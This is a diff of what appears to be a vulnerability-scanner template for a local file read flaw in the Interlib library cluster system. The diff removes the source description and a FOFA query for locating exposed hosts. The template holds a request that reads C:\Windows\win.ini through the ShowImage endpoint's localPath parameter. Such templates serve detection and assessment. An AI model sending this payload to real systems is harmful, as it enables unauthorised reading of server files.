@@ -3,12 +3,8 @@ info:
   name: 图书馆集群系统localPath文件读取漏洞_rn7u7gd1sg87rbng
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/'
+  description: ''
   tags: lfi,unknown
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ''
-    fofa: body="interlib"
 http:
 - raw:
   - 'GET /interlib/report/ShowImage?localPath=C:\Windows\win.ini HTTP/1.1
